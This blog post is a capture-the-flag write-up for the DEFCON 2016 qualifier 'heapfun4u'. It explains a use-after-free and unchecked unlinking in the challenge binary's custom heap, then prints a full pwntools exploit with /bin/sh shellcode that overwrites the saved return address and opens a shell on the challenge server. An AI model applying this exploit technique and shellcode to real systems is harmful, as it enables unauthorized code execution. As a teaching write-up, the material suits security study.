---
layout: post
title: "DEFCON qualifiers 2016 - heapfun4u"
date: 2016-05-23 01:00
---

*This challenge is about a binary with a custom implemented heap. With a use after free, it is possible to corrupt the double linked free list and have the address of a chunk written at an arbitrary address. With that we overwrite the saved return pointer with the address of the shellcode and pop a shell.*

<!--more-->

### Description

```bash
Guess what, it is a heap bug.

file heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me:3957
```

### Details

Points:      variable

Category:    baby’s first

Validations: some

### Solution

This is a stripped ELF 64-bit binary with only NX enabled:

```bash
$ file heapfun4u
heapfun4u: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24,
BuildID[sha1]=b019e6cbed93d55ebef500e8c4dec79ce592fa42, stripped

$ checksec --file heapfun4u
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   heapfun4u
```

### Operation

Here is an example of Allocating a buffer, Writing to it, Freeing it. We can see that each time we have to choose a buffer, the address is shown. With Nice guy we can leak an address on the stack.

```bash
$ ./heapfun4u 
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| A
Size: 32
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| W
1) 0x7fe3ea620008 -- 32
Write where: 1
Write what: AAAAAAAA
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| F
1) 0x7fe3ea620008 -- 32
Index: 1
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| N
Here you go: 0x7ffcf20b5e2c
[A]llocate Buffer
[F]ree Buffer
[W]rite Buffer
[N]ice guy
[E]xit
| E
Leave
```

### Vulnerability

The binary has a custom implemented heap that does not have a safe unlinking method and the binary allows us to use freed chunks. Furthermore, it uses mmap to create its heap and set the permission to read, write and execute.

### Use after free

The binary keeps track of the allocated chunks in the `.bss` segment with the following information:

* an array containing the addresses of the allocated chunks
* an array containing the size of the allocated chunks
* the index of the next chunk to be allocated
* the address of the first free chunk in the double-linked free list

Each time a chunk is allocated, its address and its size is put in the two arrays, but they are not removed when their corresponding chunk is freed. Therefore it is possible to free a chunk twice.

### No safe unlinking

When a chunk is freed, it is put in the double linked free list. The foward and backward pointers are put at the end of the chunk (this is the opposite of what glibc unlink does). Howerever their is no checks that the pointers points to valid chunks:

* the backward pointer of the foward chunk should point back to the current chunk
* and vice versa for the foward pointer of the backward chunk

If the chunk that follows the chunk we want to free, is free, they will be coalesced:

* The size of the following chunk will be added to the current one
* If the following chunk has a not NULL foward pointer, it will replace the backward pointer of the chunk pointed by the forward pointer of following chunks with the address of the current chunk

One last thing to note is that in the size of a chunk, the two least significant bit are used to set the state of a chunk.

```bash

    +---------+
    | size    | <= chunk that must be freed
    | data    | <= address of the buffer
    . ...     .
    |         |
    |         |
    +---------+
 ,->| size    | <= already freed chunk
 |  |         |
 |  . ...     .
 |,-| fwd ptr |
 || | bak ptr |
 || +---------+
 || .         .
 || +---------+
 |`>| size    | <= another freed chunk
 |  |         |
 |  . ...     .
 |  | fwd ptr |
 `--| bak ptr | <= that backward pointer will point to the chunk that must
    +---------+    be freed
```

After the free:

```bash

    +---------+
 ,->| size    | <= chunk that has been freed
 |  | data    |
 |  . ...     .
 |  |         |
 |  |         |
 |  |         |
 |  |         |
 |  |         |
 |  .         .
 |,-| fwd ptr |
 || | bak ptr |
 || +---------+
 || .         .
 || +---------+
 |`>| size    | <= another freed chunk
 |  |         |
 |  . ...     .
 |  | fwd ptr |
 `--| bak ptr | <= that backward pointer now points to the newly freed chunk
    +---------+
```

To find that backward pointer, it adds to the forward pointer, the size of the pointed chunks. If we can control a forward pointer and the area pointed by it, we have a write something where.

### Exploitation

The idea is to overwrite the saved rip pointer of the stack frame of the main function so that when we choose the option Leave, it will return to the address of a chunk where our shellcode is:

* Allocate 3 buffers
* Free buffer 2, then 1: buffer 1 will be at the top of the free list
* Allocate a fourth buffer that is as big as the two freed buffers combined: it should be placed right over buffers 1 and 2
* write in buffer 4:
  * a size that will lead to the saved rip address
  * padding to fill buffer 1
  * a fake allocated chunks
  * padding to fill the fake chunk
  * a fake freed chunk with a forward pointer that points to the buffer 1
* free buffer 2 a second time: saved rip is overwritten by the address of buffer 2
* write in buffer 4:
  * padding to fill buffer 1
  * shellcode
* leave

### Payload

Here is the script that implements the above steps:

```python
#!/usr/bin/env python2

from pwn import *

#PRINT=True
PRINT=False
PROMPT='| '

# http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode  = "\x48\x31\xd2"                             # xor    %rdx, %rdx
shellcode += "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" # mov    $0x68732f6e69622f2f, %rbx
shellcode += "\x48\xc1\xeb\x08"                         # shr    $0x8, %rbx
shellcode += "\x53"                                     # push   %rbx
shellcode += "\x48\x89\xe7"                             # mov    %rsp, %rdi
shellcode += "\x50"                                     # push   %rax
shellcode += "\x57"                                     # push   %rdi
shellcode += "\x48\x89\xe6"                             # mov    %rsp, %rsi
shellcode += "\xb0\x3b"                                 # mov    $0x3b, %al
shellcode += "\x0f\x05";                                # syscall

# socat tcp-l:3957,reuseaddr,fork exec: heapfun4u
#r = remote('localhost', 3957)
r = remote('heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me', 3957)

def recvuntil(rec='', p=PRINT):
    global r
    data = r.recvuntil(rec)
    if p:
        print(data)
    return data

def sendline(msg='', p=PRINT):
    global r
    r.sendline(msg)

def sr(rec=PROMPT, msg='', p=PRINT):
    data = recvuntil(rec, p)
    sendline(msg, p)
    if p:
        print(msg)
    return data

def allocate(size):
    sr(msg='A')
    sr(': ', size)

def free(num):
    sr(msg='F')
    sr(': ', num)

def write(num, data):
    sr(msg='W')
    leak = sr(': ', num)
    addr = 0
    for line in leak.split('\n'):
        if line[0] == num:
            addr = int(line.split()[1], 16)
    sr(': ', data)
    if addr:
        return addr

def leak():
    sr(msg='N')
    recvuntil(': ')
    addr = recvuntil('\n')
    return int(addr, 16)

def leave():
    sr(msg='E')


stack_ptr = leak()
log.info('leaked stack ptr: {}'.format(hex(stack_ptr)))
saved_rip = stack_ptr + 316
log.info('saved rip at:     {}'.format(hex(saved_rip)))
allocate('16')  # buffer 1
allocate('128') # buffer 2
allocate('16')  # buffer 3
free('2')
free('1')
allocate('128') # buffer 4
fwptr_addr = write('4', 'AAAAAAAA')
log.info('forward ptr addr: {}'.format(hex(fwptr_addr)))
mal_size = saved_rip - fwptr_addr
log.info('its content:      {}'.format(hex(mal_size)))
log.info('sanity check:     {}'.format(hex(fwptr_addr + mal_size)))

unlink_payload  = p64(mal_size)   # fill buffer 1
unlink_payload += p64(0)          # (no bk ptr)
unlink_payload += p64(16 + 1 + 2) # fake buffer size
unlink_payload += 'BBBBBBBB' * 2  # fill fake buffer
unlink_payload += p64(16 + 2)     # fake freed buffer size
unlink_payload += p64(fwptr_addr) # fwd pointer
unlink_payload += p64(0)          # no bk ptr
write('4', unlink_payload)
free('2')

payload  = 'AAAAAAAA' * 2 # fill buffer 1
payload += shellcode

write('4', payload)
leave()

r.interactive()
```

Once executed:

```bash
$ ./payload.py
[+] Opening connection to heapfun4u_873c6d81dd688c9057d5b229cf80579e.quals.shallweplayaga.me on port 3957: Done
[*] leaked stack ptr: 0x7fffdfb31ffc
[*] saved rip at:     0x7fffdfb32138
[*] forward ptr addr: 0x7fa1d8757008
[*] its content:      0x5e073db130
[*] sanity check:     0x7fffdfb32138
[*] Switching to interactive mode
Leave
$ ls
flag
heapfun4u
$ cat flag
The flag is: Oh noze you pwned my h33p.
$
```
